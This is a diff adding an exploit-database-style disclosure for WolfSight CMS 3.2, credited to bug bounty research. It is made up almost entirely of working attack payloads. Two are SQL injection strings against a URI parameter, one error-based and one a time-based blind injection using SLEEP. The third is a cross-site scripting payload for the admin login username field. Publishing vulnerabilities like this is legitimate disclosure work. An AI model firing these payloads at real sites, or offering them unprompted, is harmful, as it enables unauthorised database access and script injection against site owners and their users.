@@ -1,0 +1,31 @@
+# Exploit Title: WolfSight CMS 3.2 - SQL Injection
+# Google Dork: N/A
+# Date: 2018-07-10
+# Exploit Author: Berk Dusunur & Zehra Karabiber
+# Vendor Homepage: http://www.wolfsight.com
+# Software Link: http://www.wolfsight.com
+# Version: v3.2
+# Tested on: Parrot OS / WinApp Server
+# CVE : N/A
+
+# PoC Sql Injection
+# Parameter: #1* (URI)
+# Type: error-based
+# Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+# Payload: 
+
+http://www.ip/page1-%bf%bf"-page1/' AND (SELECT 7988 FROM(SELECT COUNT(*),CONCAT(0x717a766a71,(SELECT(ELT(7988=7988,1))),0x71766b7071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'WpDn'='WpDn
+
+# Type: AND/OR time-based blind
+# Title: MySQL >= 5.0.12 OR time-based blind
+# Payload: 
+
+http://www.ip/page1-%bf%bf"-page1/'OR SLEEP(5) AND 'kLLx'='kLLx
+
+# PoC Cross-Site Scripting
+# http://ip/admin/login.php
+# Username
+
+<IMG SRC=”javascript:alert(‘EZK’);”>
+
+# This vulnerability was identified during bug bounty
